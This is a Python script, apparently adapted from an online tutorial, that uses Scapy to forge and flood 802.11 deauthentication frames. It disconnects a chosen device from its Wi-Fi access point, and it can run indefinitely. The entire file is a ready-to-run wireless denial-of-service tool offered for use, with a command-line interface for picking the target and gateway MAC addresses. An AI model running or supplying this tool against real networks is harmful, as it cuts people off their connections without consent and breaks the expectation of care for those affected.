from scapy.layers.dot11 import Dot11, RadioTap, Dot11Deauth
from scapy.sendrecv import sendp
import argparse


# source code : https://www.thepythoncode.com/code/force-a-device-to-disconnect-scapy

def deauth(target_mac, gateway_mac, inter=0.1, count=0, iface="wlan0", verbose=1):
    reason = int(input("Please choose one of the following reason :\n"
                       "1 - Unspecified\n"
                       "4 - Disassociated due to inactivity\n"
                       "5 - Disassociated because AP is unable to handle all currently associated stations\n"
                       "8 - Deauthenticated because sending STA is leaving BSS\n"
                       "Enter a reason : "))

    # STA sending a deauth to AP
    if reason == 1 or reason == 8:
        # 802.11 frame
        # addr1: destination MAC
        # addr2: source MAC
        # addr3: Access Point MAC
        dot11 = Dot11(addr1=gateway_mac, addr2=target_mac, addr3=gateway_mac)

    # AP sending a deauth to STA
    elif reason == 4 or reason == 5:
        dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    else:
        print("Reason code not handled!")
        return

    # stack them up
    packet = RadioTap() / dot11 / Dot11Deauth(reason=reason)

    if count == 0:
        # if count is 0, it means we loop forever (until interrupt)
        loop = 1
        count = None
    else:
        loop = 0

    # printing some info messages
    if verbose:
        if count:
            print(f"[+] Sending {count} deauthentication frames every {interval}s...")
        else:
            print(f"[+] Sending deauthentication frames every {interval}s forever...")

    # send the packet
    sendp(packet, inter=inter, count=count, loop=loop, iface=iface, verbose=verbose)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="A python script for sending deauthentication frames")
    parser.add_argument("target", help="Target MAC address to deauthenticate")
    parser.add_argument("gateway", help="Gateway MAC address that target is authenticated with")
    parser.add_argument("-c", "--count", help="Number of deauthentication frames to send, specify 0 to keep sending "
                                              "infinitely, default is 0", default=0)
    parser.add_argument("--interval",
                        help="The sending frequency (in seconds) between two frames sent, default is 0.1s",
                        default=0.1)
    parser.add_argument("-i", dest="iface", help="Interface to use, must be in monitor mode, default is 'wlan0'",
                        default="wlan0")
    parser.add_argument("-v", "--verbose", help="whether to print messages", action="store_true")

    args = parser.parse_args()
    target = args.target
    gateway = args.gateway
    count = int(args.count)
    interval = float(args.interval)
    iface = args.iface
    verbose = args.verbose

    deauth(target, gateway, interval, count, iface, verbose)
